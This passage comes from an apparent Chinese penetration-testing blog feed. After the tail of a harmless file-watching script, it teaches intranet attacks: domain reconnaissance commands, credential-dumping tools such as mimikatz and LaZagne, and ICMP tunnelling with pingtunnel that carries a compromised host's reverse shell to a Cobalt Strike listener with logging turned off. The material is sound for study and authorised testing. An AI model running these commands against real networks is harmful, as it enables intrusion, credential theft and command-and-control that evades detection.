class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from watchdog.observers import Observer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from watchdog.events import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class FileEventHandler(FileSystemEventHandler):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FileSystemEventHandler.__init__(self)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def on_moved(self, event):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if event.is_directory:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;directory moved from &amp;#123;0&amp;#125; to &amp;#123;1&amp;#125;&amp;quot;.format(event.src_path,event.dest_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;file moved from &amp;#123;0&amp;#125; to &amp;#123;1&amp;#125;&amp;quot;.format(event.src_path,event.dest_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def on_created(self, event):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if event.is_directory:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;directory created:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;file created:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def on_deleted(self, event):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if event.is_directory:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;directory deleted:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;file deleted:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def on_modified(self, event):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if event.is_directory:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;directory modified:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;file modified:&amp;#123;0&amp;#125;&amp;quot;.format(event.src_path))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;quot;__main__&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  observer = Observer()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  event_handler = FileEventHandler()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  observer.schedule(event_handler, r&amp;quot;C:\Users\wyq\Desktop\1&amp;quot;, True)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  observer.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      time.sleep(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  except KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    observer.stop()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    observer.join()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</id>
        <title>XD22 11 内网安全</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
        <content type="html">&lt;p&gt;局域网：小型办公室，家里&lt;br&gt;
工作组：学校机房，网吧&lt;br&gt;
内网域：大型机器组成的内网，域控即主控制器可以管理电脑，负责下发任务和统一管理，对所有的机器进行软件安装、环境部署&lt;/p&gt;
&lt;p&gt;域用户 whoami 会显示 DC 名字而不是主机名，此时去下载软件受限于域控，如果域控未开通域成员下载软件的功能，则域成员下载软件时需要征得域控的同意。此时如果切换为普通用户，即 whoami 显示主机名时可以下载软件，将不受域控的管理限制。&lt;/p&gt;
&lt;h3 id=&#34;域信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域信息收集&#34;&gt;#&lt;/a&gt; 域信息收集&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一些注意事项&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）linux 可以成为一个域成员主机，在域内环境并不常见。&lt;/p&gt;
&lt;p&gt;（ 2 ）域内有 DNS 服务器做解析，由域控分配解析规则，不允许在互联网解析。&lt;/p&gt;
&lt;p&gt;（ 3 ）判断是否在域内&lt;br&gt;
 &lt;code&gt;net view /domain&lt;/code&gt;  判断存在域&lt;br&gt;
 &lt;code&gt;net time /domain&lt;/code&gt;  判断主域&lt;/p&gt;
&lt;p&gt;（ 4 ）获取域控 ip&lt;br&gt;
 &lt;code&gt;net time /domain&lt;/code&gt;  获取域控时间，ping 此命令返回的域控名得到域控 ip&lt;/p&gt;
&lt;h4 id=&#34;应用-服务-权限收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#应用-服务-权限收集&#34;&gt;#&lt;/a&gt; 应用 服务 权限收集&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;systeminfo 详细信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -ano 端口列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;route print 路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net start 启动服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist 进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schtasks 计划任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ipconfig /all 判断存在域&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -ano 当前网络端口开放&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nslookup 域名 追踪来源地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic service list brief 查询本机服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net config workstation 查询当前登录域及登录用户信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic startup get command,caption 查看已启动的程序信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;网络-用户-域控收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络-用户-域控收集&#34;&gt;#&lt;/a&gt; 网络 用户 域控收集&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;net view /domain 查询域列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net time /domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net localgroup administrators 本机管理员【通常含有域用户】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user /domain 查询域用户(当前域)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group /domain 查询域工作组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group &amp;quot;domain computers&amp;quot; /domain 查看加入域的所有计算机名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group &amp;quot;domain admins&amp;quot; /domain 查询域管理员用户组和域管用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net localgroup administrators /domain 查看域管理员&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net group &amp;quot;domain controllers&amp;quot; /domain 查看域控&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net accounts /domain 查看域密码策略&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;密码-凭据-口令收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码-凭据-口令收集&#34;&gt;#&lt;/a&gt; 密码 凭据 口令收集&lt;/h4&gt;
&lt;p&gt;旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备&lt;br&gt;
计算机用户 HASH，明文获取 - mimikatz (win)，mimipenguin (linux)&lt;br&gt;
 计算机各种协议服务口令获取 - LaZagne (all)，XenArmor (win)，CS 插件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHov&#34;&gt;https://github.com/gentilkiwi/mimikatz/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmUv&#34;&gt;https://github.com/AlessandroZ/LaZagne/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==&#34;&gt;https://github.com/huntergregal/mimipenguin&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ZW5hcm1vci5jb20vYWxsaW5vbmUtcGFzc3dvcmQtcmVjb3ZlcnktcHJvLXNvZnR3YXJlLw==&#34;&gt;https://xenarmor.com/allinone-password-recovery-pro-software/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（ 1 ）站点源码备份文件、数据库备份文件等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（ 2 ）各类数据库Web管理入口，如PHPMyAdmin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（ 3 ）浏览器保存密码、浏览器Cookies&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（ 5 ）其他用户会话、 3389 和ipc$连接记录、回收站内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（ 6 ）Windows 保存的WIFI密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（ 7 ）网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;````&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;### 自动化工具探针&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;工具只是辅助，实际过程中涉及到的问题繁多，需要配合手动解决各种问题。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/k8gege/LadonGo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/BloodHoundAD/BloodHound&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.joeware.net/freetools/tools/adfind/index.htm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CS插件：LSTAR Ladon OLa TaoWu等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- Adfind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;列出域控制器名称：AdFind -sc dclist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前域中在线的计算机：AdFind -sc computers_active&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前域中在线的计算机(只显示名称和操作系统)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -sc computers_active name operatingSystem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前域中所有计算机：AdFind -f &amp;quot;objectcategory=computer&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询当前域中所有计算机(只显示名称和操作系统)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -f &amp;quot;objectcategory=computer&amp;quot; name operatingSystem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询域内所有用户：AdFind -users name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询所有GPO：AdFind -sc gpodmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;BloodHound 域分析使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NuLXNlYy5jb20vYXJjaGl2ZXMvMTQ2NTQ4Lmh0bWw=&#34;&gt;http://cn-sec.com/archives/146548.html&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k&#34;&gt;https://github.com/BloodHoundAD/BloodHound&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;攻击机启动 neo4j 数据库 neo4j.bat console、内网启动 BloodHound 收集信息 SharpHound.exe -c all 生成 zip 文件、运行 BloodHound.exe 后将生成数据导入，筛选查看。&lt;/p&gt;
&lt;h3 id=&#34;隧道技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隧道技术&#34;&gt;#&lt;/a&gt; 隧道技术&lt;/h3&gt;
&lt;h4 id=&#34;隧道基础理论&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隧道基础理论&#34;&gt;#&lt;/a&gt; 隧道基础理论&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;相关名词解释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）&lt;br&gt;
代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）&lt;br&gt;
域控防火墙更新策略：域控通过强制按钮或域内用户用 gpupdate/force 更新域控防火墙设置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域控防火墙 - 组策略不出网上线&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。可利用正向连接或者隧道技术来实现。&lt;/p&gt;
&lt;p&gt;tcp 转 ICMP 协议出网在返回 tcp 协议项目：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=&#34;&gt;https://github.com/esrrhs/spp&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JkYW1lbGUvaWNtcHNo&#34;&gt;https://github.com/bdamele/icmpsh&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9waW5ndHVubmVs&#34;&gt;https://github.com/esrrhs/pingtunnel&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用出网协议建立隧道&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SMB 隧道： 445 通讯、借助通讯后绑定上线、直接 SMB 协议通讯即可&lt;br&gt;
 ICMP 隧道：ping 命令、借助项目 (icmpsh icmptunnel pingtunnel) 通讯&lt;br&gt;
 DNS 隧道：nslookup dig、内网主机只出网 DNS 协议数据，&lt;br&gt;
SSH 隧道：由于 cs 无 SSH 协议监听器配置，无法上线&lt;/p&gt;
&lt;p&gt;域名申请及配置 ns 解析记录、监听器创建选择 DNS 解析及其地址、后门绑定监听器，肉鸡执行 DNS 设置的木马上线主机，是一个 unknown 的主机，输入相关命令后成功上线。&lt;/p&gt;
&lt;h4 id=&#34;icmp-隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#icmp-隧道&#34;&gt;#&lt;/a&gt; icmp 隧道&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;cs 控制 tcp 被禁用的域内主机&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;跳板机开启隧道&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pingtunnel -type server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;肉鸡(管理器运行)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t 192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS监听器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127.0.0.1 6666 192.168.46.66 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成第一个监听器的Stager后门肉鸡执行后上线第二个监听器的马肉鸡将流经本地tcp流量的 6666 端口以icmp流量的方式转发至跳板机的 7777 端口，并且不输出任何日志，跳板机负责接收此流量。cs 的木马监听器从跳板机的 7777 端口处获取到肉鸡的反弹shell。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;msf 控制 tcp 被禁用的域内主机&lt;/li&gt;
&lt;/ul&gt;
